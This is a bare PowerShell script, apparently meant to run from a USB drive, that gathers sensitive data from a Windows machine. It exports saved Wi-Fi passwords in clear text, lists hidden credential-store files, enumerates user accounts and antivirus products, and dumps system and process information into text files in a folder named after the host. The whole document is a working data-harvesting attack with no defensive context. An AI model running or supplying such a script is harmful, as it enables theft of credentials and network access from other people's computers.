$fdrive=get-volume | where drivetype -eq removable | foreach driveletter
$cpu_name = hostname
if (Test-Path -Path "$cpu_name")
{
} else {
	mkdir $cpu_name
}

cd $cpu_name
netsh wlan export profile key=clear
cmd /c "ipconfig" > ip_config.txt
cmd /c "wmic /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo no Antivirus installed" > anti_viruses.txt
net users > users.txt
echo $env:UserName > user.txt
Get-ChildItem -Hidden C:\Users\$env:UserName\AppData\Local\Microsoft\Credentials > LocalCreds.txt
Get-ChildItem -Hidden C:\Users\$env:UserName\AppData\Roaming\Microsoft\Credentials > RoamingCreds.txt
systeminfo > sys.txt
tasklist /svc > tasks.txt